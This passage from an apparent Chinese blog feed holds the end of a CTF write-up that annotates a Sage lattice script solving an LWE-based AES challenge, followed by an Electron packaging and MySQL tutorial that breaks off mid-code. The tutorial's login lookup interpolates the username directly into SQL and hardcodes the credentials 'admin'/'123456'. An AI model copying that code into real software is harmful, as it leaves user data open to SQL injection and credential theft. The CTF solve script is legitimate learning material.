punctuation">(</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>    c <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>new_encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span><span class="token comment"># W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span><span class="token comment"># [ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span><span class="token comment"># [  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span><span class="token comment"># [ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span><span class="token comment"># [-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span><span class="token comment"># [ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span><span class="token comment"># [   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span><span class="token comment"># [ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span><span class="token comment"># [ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span><span class="token comment"># c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>LWE问题，我看别人说的是(因为我非常外行，如有错漏，希望读者可以指出)，<code>e = m * W + r</code>就是一个LWE的问题，这里需要求的是<code>m</code>，给的是<code>e、W</code>，然后<code>r</code>是一个随机生成的matrix</p><p><img src="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/image-20211125221252603.png" alt></p><p>然后这里我是什么都不会的，看别人的脚本，简单了解一下，看看能不能看懂他们的解题脚本，解释都在脚本里面了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>free_module_integer <span class="token keyword">import</span> IntegerLattice<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">151991736758354</span><span class="token punctuation">,</span><span class="token number">115130361237591</span><span class="token punctuation">,</span><span class="token number">58905390613532</span><span class="token punctuation">,</span><span class="token number">130965235357066</span><span class="token punctuation">,</span><span class="token number">74614897867998</span><span class="token punctuation">,</span><span class="token number">48099459442369</span><span class="token punctuation">,</span><span class="token number">45894485782943</span><span class="token punctuation">,</span><span class="token number">7933340009592</span><span class="token punctuation">,</span><span class="token number">25794185638</span><span class="token punctuation">]</span>W <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10150241248</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">11679953514</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8802490385</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">12260198788</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">10290571893</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">334269043</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">11669932300</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2158827458</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">7021995</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">52255960212</span><span class="token punctuation">,</span><span class="token number">48054224859</span><span class="token punctuation">,</span><span class="token number">28230779201</span><span class="token punctuation">,</span><span class="token number">43264260760</span><span class="token punctuation">,</span><span class="token number">20836572799</span><span class="token punctuation">,</span><span class="token number">8191198018</span><span class="token punctuation">,</span><span class="token number">14000400181</span><span class="token punctuation">,</span><span class="token number">4370731005</span><span class="token punctuation">,</span><span class="token number">14251110</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">2274129180</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1678741826</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1009050115</span><span class="token punctuation">,</span><span class="token number">1858488045</span><span class="token punctuation">,</span><span class="token number">978763435</span><span class="token punctuation">,</span><span class="token number">4717368685</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">561197285</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1999440633</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6540190</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">45454841384</span><span class="token punctuation">,</span><span class="token number">34351838833</span><span class="token punctuation">,</span><span class="token number">19058600591</span><span class="token punctuation">,</span><span class="token number">39744104894</span><span class="token punctuation">,</span><span class="token number">21481706222</span><span class="token punctuation">,</span><span class="token number">14785555279</span><span class="token punctuation">,</span><span class="token number">13193105539</span><span class="token punctuation">,</span><span class="token number">2306952916</span><span class="token punctuation">,</span><span class="token number">7501297</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">16804706629</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">13041485360</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8292982763</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">16801260566</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">9211427035</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4808377155</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6530124040</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2572433293</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8393737</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">28223439540</span><span class="token punctuation">,</span><span class="token number">19293284310</span><span class="token punctuation">,</span><span class="token number">5217202426</span><span class="token punctuation">,</span><span class="token number">27179839904</span><span class="token punctuation">,</span><span class="token number">23182044384</span><span class="token punctuation">,</span><span class="token number">10788207024</span><span class="token punctuation">,</span><span class="token number">18495479452</span><span class="token punctuation">,</span><span class="token number">4007452688</span><span class="token punctuation">,</span><span class="token number">13046387</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">968256091</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1507028552</span><span class="token punctuation">,</span><span class="token number">1677187853</span><span class="token punctuation">,</span><span class="token number">8685590653</span><span class="token punctuation">,</span><span class="token number">9696793863</span><span class="token punctuation">,</span><span class="token number">2942265602</span><span class="token punctuation">,</span><span class="token number">10534454095</span><span class="token punctuation">,</span><span class="token number">2668834317</span><span class="token punctuation">,</span><span class="token number">8694828</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">33556338459</span><span class="token punctuation">,</span><span class="token number">26577210571</span><span class="token punctuation">,</span><span class="token number">16558795385</span><span class="token punctuation">,</span><span class="token number">28327066095</span><span class="token punctuation">,</span><span class="token number">10684900266</span><span class="token punctuation">,</span><span class="token number">9113388576</span><span class="token punctuation">,</span><span class="token number">2446282316</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">173705548</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">577070</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\<span class="token punctuation">[</span><span class="token number">35404775180</span><span class="token punctuation">,</span><span class="token number">32321129676</span><span class="token punctuation">,</span><span class="token number">15071970630</span><span class="token punctuation">,</span><span class="token number">24947264815</span><span class="token punctuation">,</span><span class="token number">14402999486</span><span class="token punctuation">,</span><span class="token number">5857384379</span><span class="token punctuation">,</span><span class="token number">10620159241</span><span class="token punctuation">,</span><span class="token number">2408185012</span><span class="token punctuation">,</span><span class="token number">7841686</span><span class="token punctuation">]</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token string">"1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0"</span><span class="token keyword">def</span> <span class="token function">CVP</span><span class="token punctuation">(</span>lattice<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"executing Gram_Schmidt"</span><span class="token punctuation">)</span>    gram <span class="token operator">=</span> lattice<span class="token punctuation">.</span>gram_schmidt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finish"</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> target    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>lattice<span class="token punctuation">.</span>nrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t <span class="token operator">*</span> gram<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>gram<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> gram<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        t <span class="token operator">-=</span> lattice<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> c    <span class="token keyword">return</span> target <span class="token operator">-</span> tA <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> W<span class="token punctuation">)</span>B <span class="token operator">=</span> matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> W<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Executing LLL"</span><span class="token punctuation">)</span>lattice <span class="token operator">=</span> IntegerLattice<span class="token punctuation">(</span>B<span class="token punctuation">,</span> lll_reduce<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment">#lll获得格内约减基</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finish"</span><span class="token punctuation">)</span>target <span class="token operator">=</span> vector<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token comment"># 将list转为vector</span>P<span class="token operator">=</span>CVP<span class="token punctuation">(</span>lattice<span class="token punctuation">.</span>reduced_basis<span class="token punctuation">,</span>target<span class="token punctuation">)</span>  <span class="token comment"># 执行CVP解脚本，获得的应该就是带有噪音r的，即m * W = e - r，这个P应该就是e-r吧(或者说是一个格点?)</span>solution<span class="token operator">=</span>A<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>P<span class="token punctuation">)</span>  <span class="token comment"># 求得solution x A=P，求得左乘的内容，即是m。就是key。</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AESc <span class="token operator">=</span> <span class="token number">0x1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span>M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">877</span><span class="token punctuation">,</span> <span class="token number">619</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">977</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">,</span> <span class="token number">941</span><span class="token punctuation">,</span> <span class="token number">947</span><span class="token punctuation">,</span> <span class="token number">1031</span><span class="token punctuation">,</span> <span class="token number">821</span><span class="token punctuation">]</span>key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'flag&#123;be5152d04a49234a251956a32b&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 共模攻击 </tag>
            
            <tag> CBC翻转攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron初体验</title>
      <link href="2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">mkdir my-electron-app &amp;&amp; cd my-electron-appnpm initnpm install --save-dev electron<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接下来就是创建主要的文件了，主要有<code>index.html</code>、<code>index.js</code>、<code>preload.js</code>。</p><h3 id="打包遇到问题"><a href="#打包遇到问题" class="headerlink" title="打包遇到问题"></a>打包遇到问题</h3><p>​    这里使用官网推荐的打包方案时出现了一点点小小的错误，如下所示，修了半天也没修好，索性换一种打包方案了。</p><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/image-20211103125439320.png" alt="image-20211103125439320"></p><h3 id="另一种打包方案"><a href="#另一种打包方案" class="headerlink" title="另一种打包方案"></a>另一种打包方案</h3><h4 id="electron-packager打包可执行文件"><a href="#electron-packager打包可执行文件" class="headerlink" title="electron-packager打包可执行文件"></a>electron-packager打包可执行文件</h4><pre class="line-numbers language-none"><code class="language-none">npm i electron-packager --save-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>在package.json中添加下面的script。</li></ol><pre class="line-numbers language-none"><code class="language-none">&quot;scripts&quot;: &#123;    &quot;package&quot;: &quot;electron-packager . ElectronDemo --platform&#x3D;win32 --arch&#x3D;x64 --icon&#x3D;computer.ico --out&#x3D;.&#x2F;out --app-version&#x3D;0.0.1 --overwrite --ignore&#x3D;node_modules&quot;  &#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>打包可执行文件命令</li></ol><pre class="line-numbers language-none"><code class="language-none">$ npm run package&gt; myelectronapp@1.0.0 package&gt; electron-packager . ElectronDemo --platform&#x3D;win32 --arch&#x3D;x64 --icon&#x3D;computer.ico --out&#x3D;.&#x2F;out --app-version&#x3D;0.0.1 --overwrite --ignore&#x3D;node_modulesPackaging app for platform win32 x64 using electron v15.3.0WARNING: Could not find icon &quot;computer.ico&quot;, not updating app iconWrote new app to out\ElectronDemo-win32-x64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="electron-builder打包安装包"><a href="#electron-builder打包安装包" class="headerlink" title="electron-builder打包安装包"></a>electron-builder打包安装包</h4><pre class="line-numbers language-none"><code class="language-none">npm i electron-builder --save-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>在package.json文件中添加一下代码:</li></ol><pre class="line-numbers language-none"><code class="language-none">&quot;build&quot;: &#123;    &quot;appId&quot;: &quot;com.example.app&quot;,    &quot;mac&quot;: &#123;      &quot;target&quot;: [ &#x2F;&#x2F; 目标包类型        &quot;dmg&quot;,        &quot;zip&quot;      ]    &#125;,    &quot;win&quot;: &#123;      &quot;target&quot;: [ &#x2F;&#x2F; 目标包类型        &quot;nsis&quot;,        &quot;zip&quot;      ]    &#125;  &#125;, &quot;scripts&quot;: &#123;    &quot;dist&quot;: &quot;electron-builder&quot;  &#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>自定义安装路径，要在buid字段里面添加个nsis的节点，其中有2个配置项是关键点：</li></ol><ul><li>oneClick设置为false</li><li>allowToChangeInstallationDirectory设置为true</li></ul><pre class="line-numbers language-none"><code class="language-none">&quot;build&quot;: &#123;    &quot;appId&quot;: &quot;com.example.app&quot;,    &quot;mac&quot;: &#123;      &quot;target&quot;: [        &quot;dmg&quot;,        &quot;zip&quot;      ],      &quot;icon&quot;: &quot;img.ico&quot;    &#125;,    &quot;win&quot;: &#123;      &quot;target&quot;: [        &quot;nsis&quot;,        &quot;zip&quot;      ],      &quot;icon&quot;: &quot;img.ico&quot; &#x2F;&#x2F; 更换桌面上生成的图标    &#125;,    &quot;nsis&quot;: &#123;      &quot;oneClick&quot;: false, &#x2F;&#x2F; 是否一键安装，建议为 false，可以让用户点击下一步、下一步、下一步的形式安装程序，如果为true，当用户双击构建好的程序，自动安装程序并打开，即：一键安装      &quot;allowToChangeInstallationDirectory&quot;: true, &#x2F;&#x2F; 允许修改安装目录，建议为 true，是否允许用户改变安装目录，默认是不允许      &quot;createDesktopShortcut&quot;: true, &#x2F;&#x2F; 创建桌面图标      &quot;createStartMenuShortcut&quot;: true, &#x2F;&#x2F; 创建开始菜单图标      &quot;installerIcon&quot;: &quot;test.ico&quot;, &#x2F;&#x2F; 安装图标      &quot;uninstallerIcon&quot;: &quot;xxx.ico&quot;, &#x2F;&#x2F; 卸载图标      &quot;installerHeaderIcon&quot;: &quot;xxx.ico&quot; &#x2F;&#x2F; 安装时头部图标    &#125;,    &quot;scripts&quot;: &#123;      &quot;dist&quot;: &quot;electron-builder&quot;    &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的json内容仅为示例，运行下面的打包命令的时候要把注释去掉，还有你不想设置icon图标的话，去掉即可，所有图标就是默认的了。</p><ol><li>打包所使用的命令为：</li></ol><pre class="line-numbers language-none"><code class="language-none">$ npm run dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="上面都配置好后打包命令"><a href="#上面都配置好后打包命令" class="headerlink" title="上面都配置好后打包命令"></a>上面都配置好后打包命令</h4><p>​    把上面的东西都搞好之后，再重新打包就简单多了，直接两个命令即可解决。</p><pre class="line-numbers language-none"><code class="language-none">npm run package &amp;&amp; npm run dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Electron配合Bootstrap使用"><a href="#Electron配合Bootstrap使用" class="headerlink" title="Electron配合Bootstrap使用"></a>Electron配合Bootstrap使用</h2><p>​    很简单，站在巨人的肩膀上解决了问题。<a href="http://caoyudong.com/2018/05/01/Electron%E4%B8%AD%E4%BD%BF%E7%94%A8Bootstrap%E5%92%8CJQuery/">巨人的博客</a></p><pre class="line-numbers language-none"><code class="language-none">npm install bootstrap --savenpm install JQuery --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Electron连接数据库"><a href="#Electron连接数据库" class="headerlink" title="Electron连接数据库"></a>Electron连接数据库</h2><p>​    怎么说呢？这个客户端连接数据库的问题，我想着应该是不能直接将数据库连接方式写到这个程序里面的，这个程序如果被逆向将会造成非常严重的数据泄露，所以最好还是把数据库服务放到服务端里面，然后本地进行查询数据库的时候，只需要访问服务端的接口即可。这里为了磨练自己的node开发能力，这里的服务端的数据库连接接口我决定使用node来编写。</p><h3 id="连接Mysql测试"><a href="#连接Mysql测试" class="headerlink" title="连接Mysql测试"></a>连接Mysql测试</h3><ol><li>首先npm init一个server的文件夹，node的入口设为<code>main.js</code></li><li><code>npm install mysql</code>下载数据库模块</li><li>新建<code>main.js</code>文件，并将以下代码写入文件</li></ol><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> mysql      <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  host     <span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>  user     <span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>  password <span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>  database <span class="token operator">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> connection<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT 1 + 1 AS solution'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The solution is: '</span><span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>solution<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Mysql表内添加内容"><a href="#Mysql表内添加内容" class="headerlink" title="Mysql表内添加内容"></a>Mysql表内添加内容</h3><p>​    这里使用方便快捷的数据库操作软件，<code>Navicat Premium 12</code>。</p><ol><li>直接先连上数据库，再进user库里面添加一个user表</li></ol><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/image-20211104134613013.png" alt></p><ol><li>再随便整一个用户名一个密码即可。</li></ol><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/image-20211104134728980.png" alt="image-20211104134728980"></p><h3 id="Mysql数据查询测试-异步问题解决"><a href="#Mysql数据查询测试-异步问题解决" class="headerlink" title="Mysql数据查询测试(异步问题解决)"></a>Mysql数据查询测试(异步问题解决)</h3><p>​    这个查询数据与返回数据到前台的时候有一个node的异步的、非阻塞的流程导致的小问题，就是在接收返回值的时候得到了undefined，研究了半天，才解决了。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> mysql      <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createconnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        host     <span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>        user     <span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>        password <span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>        database <span class="token operator">:</span> <span class="token string">'user'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> connection<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">GetPassword</span><span class="token punctuation">(</span><span class="token parameter">username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> connection <span class="token operator">=</span> <span class="token function">createconnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connection<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT PASSWORD FROM user WHERE username="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token punctuation">,</span> rej</span><span class="token punctuation">)</span> <span class="token operator">=></span>         <span class="token punctuation">&#123;</span>            connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">res</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//坑1 查询的数据不是json 是一个rowdatapocket对象</span>                    <span class="token keyword">let</span> dataString <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>dataString<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">res</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                connection<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>     <span class="token keyword">return</span> promise<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">VertifyUser</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token punctuation">,</span> rej</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">GetPassword</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token 